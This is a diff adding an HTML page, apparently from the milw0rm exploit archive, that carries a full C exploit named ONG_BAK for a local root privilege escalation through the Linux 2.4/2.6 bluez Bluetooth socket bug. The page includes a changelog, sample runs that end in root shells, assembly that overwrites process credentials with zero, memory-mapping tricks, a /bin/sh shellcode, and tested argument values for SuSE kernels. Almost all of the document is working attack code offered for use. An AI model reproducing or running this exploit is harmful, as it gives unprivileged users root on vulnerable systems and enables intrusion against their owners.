@@ -1,0 +1,265 @@
+<html>
+<head>
+<title>Linux Kernel 2.4/2.6 bluez Local Root Privilege Escalation Exploit (update)</title>
+<pre>
+/*
+
+Due to many responses i've improved the exploit
+to cover more systems!
+
+
+  ONG_BAK v0.9   [october 24th 05]
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+o universal &quot;shellcode&quot; added
+o try to use all possible memory regions
+o bugfixes
+
+qobaiashi@voyager:~/w00nf/kernelsploit&gt; ./ong_bak -100222
+-|-bluez local root exploit v.0.9  -by qobaiashi-
+ |
+ |- i've found kernel 2.6.11.4-20a-default
+ |- trampoline is at 0x804869c
+ |- trying...
+ |- [ecx: bf8d0000 ]
+ |- suitable value found!using 0xbf8d0000
+ |- the time has come to push the button...
+sh-3.00# exit
+
+
+
+
+
+
+  ONG_BAK v0.3   [april 8th 05]
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+ong_bak now checks the value of ecx and launches
+the exploit in case a suitable value has been found!
+
+
+
+  ONG_BAK v0.1   [april 4th 05]
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+
+local root exploit for the bluetooth bug
+
+usage:
+
+the bug is quite stable so you can't realy fuck things up
+if you stick to the following:
+
+play around with the negative argument until ecx points to 
+our data segment:
+
+
+qobaiashi@voyager:~&gt; ./ong_bak -1002341
+-|-local bluez exploit v.0.3  -by qobaiashi-
+ |
+ |- i've found kernel 2.6.4-52-default
+ |- trying...
+ |- [ecx: 0b8f0f0f ]
+qobaiashi@voyager:~&gt; ./ong_bak -10023411
+-|-local bluez exploit v.0.3  -by qobaiashi-
+ |
+ |- i've found kernel 2.6.4-52-default
+ |- trying...
+ |- [ecx: 0809da40 ]
+ |- suitable value found!using 0x0809da40
+ |- the time has come to push the button..
+qobaiashi@voyager:~&gt; id
+uid=0(root) gid=0(root) Gruppen=14(uucp),16(dialout),17(audio),33(video),100(users)
+qobaiashi@voyager:~&gt;
+
+
+
+that's it.
+unfortunately it's not yet very practicable..
+
+qobaiashi@u-n-f.com
+
+*/
+
+#include &lt;sys/klog.h&gt;
+#include &lt;sys/types.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;sys/socket.h&gt;
+#include &lt;bluetooth/bluetooth.h&gt;
+#include &lt;bluetooth/hci.h&gt;
+#include &lt;bluetooth/hci_lib.h&gt;
+#include &lt;sys/utsname.h&gt;
+#include &lt;sys/mman.h&gt;
+
+
+void usage(char *path);
+
+//===================[ kernel 2.6* privilege elevator ]===============================
+//===================[      qobaiashi@u-n-f.com       ]===============================
+//globals
+int uid, gid;
+
+extern load_highlevel;
+__asm__
+(
+&quot;load_highlevel:         \n&quot;
+&quot;xor    %eax, %eax       \n&quot;
+&quot;mov    $0xffffe000, %eax\n&quot;
+&quot;and    %esp,%eax        \n&quot;
+&quot;pushl  %eax             \n&quot;
+&quot;call   set_root         \n&quot;
+&quot;pop    %eax             \n&quot;
+//ret to userspace-2.6.* version
+&quot; cli                    \n&quot;
+&quot; pushl $0x7b            \n&quot;      //DS user selector
+&quot; pop   %ds              \n&quot;
+&quot; pushl %ds              \n&quot;      //SS
+&quot; pushl $0xc0000000      \n&quot;      //ESP
+&quot; pushl $0x246           \n&quot;      //EFLAGS
+&quot; pushl $0x73            \n&quot;      //CS user selector
+&quot; pushl $shellcode       \n&quot;      //EIP must not be a push /bin/sh shellcode!!
+&quot;iret                    \n&quot;
+);
+
+void set_root(unsigned int *ts)
+{
+ts = (int*)*ts;
+int cntr;
+//hope you guys are int aligned
+for(cntr = 0; cntr &lt;= 512; cntr++, ts++)
+    if( ts[0] == uid &amp;&amp; ts[1] == uid &amp;&amp; ts[4] == gid &amp;&amp; ts[5] == gid)
+      ts[0] = ts[1] = ts[4] = ts[5] = 0;
+
+}
+
+
+void shellcode()
+{
+system(&quot;/bin/sh&quot;);
+exit(0);
+}
+//====================================================================================
+//====================================================================================
+
+
+
+
+
+main(int argc, char *argv[])
+{
+char buf[2048];
+int sock, *mod = (int*)buf;
+int *linker = 0;
+
+unsigned int arg;
+int tmp;
+char *check;
+struct utsname vers;
+
+gid  = getgid();
+uid  = getuid();
+
+printf(&quot;-|-bluez local root exploit v.0.9  -by qobaiashi-\n |\n&quot;);
+if (uname(&amp;vers) &lt; 0)
+   printf(&quot; |- couldn't determine kernel version\n&quot;);
+
+else
+    printf(&quot; |- i've found kernel %s\n&quot;, vers.release);
+    
+
+printf(&quot; |- trampoline is at %p\n&quot;, &amp;load_highlevel);
+
+
+if (argc &lt; 2)
+   {
+    usage(argv[0]);
+    exit(1);
+    }
+
+if (argc == 2)
+    arg = strtoul(argv[1], 0, 0);
+
+
+if (fork() != 0)//parent watch the Oops
+   {
+    //previous Oops printing
+   usleep(1000);
+   if ((tmp = klogctl(0x3, buf, 1700)) &gt; -1)
+       {
+        check = strstr(buf, &quot;ecx: &quot;);
+        printf(&quot; |- [%0.14s]\n&quot;, check);
+        check+=5;
+        *(check+9) = 0x00;*(--check) = 'x';*(--check) = '0';
+        mod = (unsigned int*)strtoul(check, 0, 0);
+        //page align FIXME: might be booggy
+        int *ecx = mod;
+        mod = (int)mod &amp;~ 0x00000fff;
+        linker = 
+mmap((void*)mod,0x2000,PROT_WRITE|PROT_READ,MAP_SHARED|MAP_ANONYMOUS|MAP_FIXED,0,0);
+        if(linker == mod)//we could mmap the area
+          {
+           printf(&quot; |- suitable value found!using %p\n&quot;, mod);
+           printf(&quot; |- the time has come to push the button... \n&quot;);
+           for (sock = 0;sock &lt;= 1;sock++)          //use ecx
+                *(ecx++) = (int)&amp;load_highlevel;   //link to shellcode
+           }
+
+           else 
+             {
+              printf(&quot; |- could not mmap   %p\n&quot;, mod);
+              if( brk((void*)mod+0x200 ) == -1)
+                {
+                 printf(&quot; |- could not brk to %p\n&quot;, mod);
+                 printf(&quot; `-------------------------------\n&quot;);
+                 exit(-1);
+                 }
+              //here we did it
+              printf(&quot; |- suitable value found!using %p\n&quot;, mod);
+              printf(&quot; |- the time has come to push the button... \n&quot;);
+              for (sock = 0;sock &lt;= 1;sock++)          //use ecx
+                  *(ecx++) = (int)&amp;load_highlevel;    //link to shellcode
+
+              }
+           if ((sock = socket(AF_BLUETOOTH, SOCK_RAW, arg)) &lt; 0)
+               exit(1);
+                               
+        }
+   return 0;
+   }
+
+if (fork() == 0)//child does the pre-exploit
+{
+  printf(&quot; |- trying...\n&quot;);
+  if ((sock = socket(AF_BLUETOOTH, SOCK_RAW, arg)) &lt; 0)
+      {
+      printf(&quot; |- something went w0rng (invalid value)\n&quot;);
+      exit(1);
+     }
+}
+
+exit(0);
+}
+
+
+
+/*****************\
+|**    usage    **|
+\*****************/
+void usage(char *path)
+{
+printf(&quot; |----------------------------\n&quot;);
+printf(&quot; | usage: %s &lt;negative value&gt; \n&quot;, path);
+printf(&quot; | tested:\n&quot;);
+printf(&quot; | SuSE 9.1:      -10023411  \n&quot;);
+printf(&quot; |                -41122122 \n&quot;);
+printf(&quot; | Kernel 2.6.11: -10023 \n&quot;);
+printf(&quot; | SuSE 9.3:      -100222\n&quot;);
+printf(&quot; |                -102901\n&quot;);
+printf(&quot; `-----------------------\n&quot;);
+exit(0);
+}
+
+// 1st post: milw0rm.com [2005-04-09]
+
+// milw0rm.com [2005-10-26]
+</pre>
+</html>
+
